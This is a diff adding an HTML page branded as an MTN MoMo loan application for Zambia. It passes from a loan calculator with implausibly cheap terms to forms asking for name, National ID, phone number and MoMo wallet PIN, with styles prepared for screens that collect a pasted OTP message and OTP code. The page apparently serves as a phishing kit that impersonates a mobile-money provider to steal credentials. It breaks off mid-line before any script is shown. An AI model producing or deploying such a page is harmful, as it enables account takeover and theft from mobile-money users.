@@ -1,0 +1,653 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo Loan Application</title>
+    <style>
+        :root {
+            --momo-blue: #002D72;
+            --momo-yellow: #FFCC00;
+            --momo-green: #00A859;
+            --momo-light-blue: #E6F0FF;
+            --text-dark: #333333;
+            --text-gray: #666666;
+            --border-color: #E0E0E0;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 10px;
+        }
+
+        /* App Container mimicking a mobile screen */
+        #app-container {
+            width: 100%;
+            max-width: 420px;
+            height: 850px;
+            background-color: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Screen Transitions */
+        .screen {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+            overflow-y: auto;
+            animation: fadeIn 0.3s ease;
+            position: relative;
+        }
+
+        .screen.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Header Styles */
+        .momo-header {
+            background-color: var(--momo-blue);
+            padding: 30px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            border-bottom-left-radius: 30px;
+            border-bottom-right-radius: 30px;
+        }
+
+        .momo-logo-text {
+            color: var(--momo-yellow);
+            font-weight: 900;
+            font-size: 24px;
+            letter-spacing: 1px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .momo-logo-text span {
+            font-size: 12px;
+            color: white;
+            font-weight: normal;
+            letter-spacing: 0.5px;
+        }
+
+        /* Common Button Styles */
+        .btn-primary {
+            background-color: var(--momo-blue);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-primary:active {
+            background-color: #001f4d;
+        }
+
+        .btn-green {
+            background-color: var(--momo-green);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        /* --- SCREEN 1: Loan Calculator --- */
+        #screen-calculator .header {
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid var(--momo-green);
+        }
+
+        #screen-calculator .header img {
+            height: 40px;
+        }
+
+        .welcome-icon {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: var(--momo-blue);
+            font-size: 12px;
+        }
+
+        .welcome-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: var(--momo-blue);
+        }
+
+        .promo-text {
+            text-align: center;
+            padding: 20px 20px 10px;
+        }
+
+        .promo-text h2 {
+            color: var(--momo-green);
+            font-size: 20px;
+            margin-bottom: 5px;
+        }
+
+        .promo-text p {
+            color: var(--momo-green);
+            font-size: 12px;
+        }
+
+        .calculator-card {
+            background: white;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 10px 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            border: 1px solid #eee;
+        }
+
+        .calculator-card h3 {
+            text-align: center;
+            font-weight: 500;
+            margin-bottom: 20px;
+            font-size: 18px;
+        }
+
+        .slider-container {
+            margin-bottom: 20px;
+        }
+
+        .slider-labels {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: var(--text-gray);
+            margin-top: 5px;
+        }
+
+        .loan-amount-display {
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: var(--text-dark);
+        }
+
+        /* Custom Range Slider */
+        input[type=range] {
+            -webkit-appearance: none;
+            width: 100%;
+            background: transparent;
+        }
+
+        input[type=range]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            height: 24px;
+            width: 24px;
+            border-radius: 50%;
+            background: white;
+            border: 2px solid #ccc;
+            cursor: pointer;
+            margin-top: -10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        input[type=range]::-webkit-slider-runnable-track {
+            width: 100%;
+            height: 6px;
+            cursor: pointer;
+            background: var(--momo-blue);
+            border-radius: 3px;
+        }
+
+        .term-label {
+            text-align: center;
+            font-size: 12px;
+            color: var(--text-gray);
+            margin-top: 15px;
+            margin-bottom: 5px;
+        }
+
+        .term-display {
+            text-align: center;
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 15px;
+        }
+
+        .term-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .term-btn {
+            background: white;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 10px;
+            font-size: 14px;
+            color: var(--text-dark);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .term-btn.active {
+            background-color: var(--momo-green);
+            color: white;
+            border-color: var(--momo-green);
+        }
+
+        .payment-box {
+            background-color: var(--momo-light-blue);
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .payment-box .label {
+            font-size: 12px;
+            color: var(--text-gray);
+            margin-bottom: 5px;
+        }
+
+        .payment-box .amount {
+            font-size: 28px;
+            font-weight: bold;
+            color: var(--text-dark);
+        }
+
+        .payment-box .apr {
+            font-size: 12px;
+            color: var(--text-gray);
+            margin-top: 5px;
+        }
+
+        /* --- SCREEN 2: Application Form --- */
+        #screen-form .form-content {
+            padding: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: var(--text-dark);
+            margin-bottom: 5px;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            border-color: var(--momo-blue);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-group input {
+            margin-top: 4px;
+            width: 16px;
+            height: 16px;
+        }
+
+        .checkbox-group label {
+            font-size: 12px;
+            color: var(--text-gray);
+            line-height: 1.4;
+        }
+
+        /* --- SCREEN 3: MoMo Number --- */
+        .momo-phone-input {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .country-select {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 16px;
+            width: 90px;
+        }
+
+        .momo-phone-input input {
+            flex: 1;
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+        }
+
+        /* --- SCREEN 4: PIN Entry --- */
+        .pin-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 30px 0;
+        }
+
+        .pin-box {
+            width: 50px;
+            height: 60px;
+            border: 2px solid #ccc;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            outline: none;
+        }
+
+        .pin-box:focus {
+            border-color: var(--momo-blue);
+        }
+
+        /* --- SCREEN 5: OTP Message --- */
+        .otp-message-box {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 14px;
+            resize: none;
+            height: 150px;
+            margin-top: 20px;
+            outline: none;
+        }
+
+        /* --- SCREEN 6: OTP Code --- */
+        .otp-input-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 30px 0;
+        }
+
+        .otp-box {
+            width: 55px;
+            height: 65px;
+            border: 2px solid #ccc;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: bold;
+            outline: none;
+            background: #f9f9f9;
+        }
+
+        .otp-box:focus {
+            border-color: var(--momo-blue);
+            background: white;
+        }
+
+        .otp-manual-input {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .otp-manual-input input {
+            width: 120px;
+            padding: 8px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            text-align: center;
+            letter-spacing: 3px;
+        }
+
+        /* --- SUCCESS SCREEN --- */
+        .success-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .success-icon {
+            width: 60px;
+            height: 60px;
+            background: var(--momo-green);
+            color: white;
+            border-radius: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 30px;
+            margin-bottom: 20px;
+        }
+
+        /* Utility Classes */
+        .text-center { text-align: center; }
+        .mt-20 { margin-top: 20px; }
+        .mb-20 { margin-bottom: 20px; }
+        .p-20 { padding: 20px; }
+        .flex-1 { flex: 1; }
+        .link { color: var(--momo-blue); text-decoration: none; font-size: 14px; cursor: pointer; }
+        .text-green { color: var(--momo-green); }
+        
+        .btn-disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+
+<div id="app-container">
+    
+    <!-- ================= SCREEN 1: LOAN CALCULATOR ================= -->
+    <div id="screen-calculator" class="screen active">
+        <div class="header">
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <div style="background: var(--momo-blue); border-radius: 8px; padding: 5px 10px; color: var(--momo-yellow); font-weight: 900; font-size: 14px;">MoMo</div>
+                <span style="font-size: 10px; font-weight: bold; color: var(--momo-yellow); display: block; margin-top: -10px;">from MTN</span>
+            </div>
+            <div class="welcome-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                <span>Welcome</span>
+            </div>
+        </div>
+
+        <div class="promo-text">
+            <h2>Get Your Loan Approved Fast</h2>
+            <p>Quick approval • Competitive rates • Flexible terms</p>
+        </div>
+
+        <div class="calculator-card">
+            <h3>Loan Calculator</h3>
+            
+            <div class="slider-container">
+                <div class="loan-amount-display" id="loanAmountDisplay">ZMW 5,000</div>
+                <input type="range" id="loanAmountSlider" min="1000" max="200000" step="500" value="5000">
+                <div class="slider-labels">
+                    <span>ZMW 1,000</span>
+                    <span>ZMW 200,000</span>
+                </div>
+            </div>
+
+            <div class="term-label">LOAN TERM</div>
+            <div class="term-display" id="termDisplay">12 months</div>
+
+            <div class="term-grid">
+                <button class="term-btn" data-term="6">6 months</button>
+                <button class="term-btn active" data-term="12">12 months</button>
+                <button class="term-btn" data-term="24">24 months</button>
+                <button class="term-btn" data-term="36">36 months</button>
+                <button class="term-btn" data-term="48">48 months</button>
+                <button class="term-btn" data-term="60">60 months</button>
+            </div>
+
+            <div class="payment-box">
+                <div class="label">MONTHLY PAYMENT</div>
+                <div class="amount" id="monthlyPaymentDisplay">ZMW 426.89</div>
+                <div class="apr" id="aprDisplay">Interest rate: 4.5% APR</div>
+            </div>
+
+            <button class="btn-primary" onclick="goToScreen('screen-form')">APPLY NOW</button>
+        </div>
+    </div>
+
+    <!-- ================= SCREEN 2: APPLICATION FORM ================= -->
+    <div id="screen-form" class="screen">
+        <div class="momo-header">
+            <div class="momo-logo-text">
+                MoMo
+                <span>from MTN</span>
+            </div>
+        </div>
+
+        <div class="form-content flex-1">
+            <h3 class="text-center mb-20">Application Form</h3>
+            
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" id="fullName" placeholder="Enter your full name" required>
+            </div>
+            <div class="form-group">
+                <label>Phone Number</label>
+                <input type="tel" id="phoneNumber" placeholder="09XXXXXXXX" required>
+            </div>
+            <div class="form-group">
+                <label>National ID</label>
+                <input type="text" id="nationalId" placeholder="Enter National ID" required>
+            </div>
+            <div class="form-group">
+                <label>Loan Amount (ZMW)</label>
+                <input type="number" id="formLoanAmount" placeholder="5000" required>
+            </div>
+            <div class="form-group">
+                <label>Employment Status</label>
+                <select id="employmentStatus">
+                    <option value="employed">Employed</option>
+                    <option value="self-employed" selected>Self-Employed</option>
+                    <option value="unemployed">Unemployed</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Monthly Net Income (ZMW)</label>
+                <input type="number" id="monthlyIncome" placeholder="Enter monthly income" required>
+            </div>
+            <div class="form-group">
+                <label>Repayment period</label>
+                <select id="repaymentPeriod">
+                    <option value="6">6 months</option>
+                    <option value="12" selected>12 months</option>
+                    <option value="24">24 months</option>
+                </select>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="termsCheckbox">
+                <label for="termsCheckbox">I confirm that the information provided is true and I agree to the MTN advance Loan terms and conditions.</label>
+            </div>
+
+            <button class="btn-primary" id="btnSubmitApp" onclick="submitApplication()">SUBMIT APPLICATION</button>
+        </div>
+    </div>
+
+    <!-- ================= SCREEN 3: MOMO NUMBER ENTRY ================= -->
+    <div id="screen-momo-number" class="screen">
+        <div class="momo-header" style="flex: 0.4;">
+            <div class="momo-logo-text">
+                MoMo
+                <span>from MTN</span>
+            </div>
+        </div>
+
+        <div class="p-20 flex-1 text-center" style="display: flex; flex-direction: column; justify-content: center;">
+            <h3 class="mb-20">Welcome to MoMo</h3>
+            <div class="momo-phone-input">
+                <div class="country-select">
+                    <span>🇿🇲</span>
+                    <span>+260</span>
+                </div>
+                <input type="tel" id="momoPhoneNumber" placeholder="Enter mobile number">
+            </div>
+            <br>
+            <button class="btn-primary" onclick="goToScreen('screen-momo-pin')">NEXT</button>
+            <p class="mt-20" style="font-size: 12px; color: var(--text-gray);">
+                By using this app you agree to our <a href="#" style="color: var(--momo-blue);">MobileTerms of use and Privacy Policy</a>
+            </p>
+        </div>
+    </div>
+
+    <!-- ================= SCREEN 4: MOMO PIN ENTRY ================= -->
+    <div id="screen-momo-pin" class="screen">
+        <div class="momo-header" style="flex: 0.4;">
+            <div class="momo-logo-text">
+                MoMo
+                <span>from MTN</span>
+            </div>
+        </div>
+
+        <div class="p-20 flex-1 text-center" style="display: flex; flex-direction: column; justify-content: center;">
+            <h3 class="mb-20">Enter your PIN</h3>
+            
+            <div class="pin-container">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+            </div>
+            
+            <p class="mb-20"><a href="#" class="link">Forgot PIN?</a></p>
+            <button class="btn-primary" onclick="goToScreen('screen-otp-
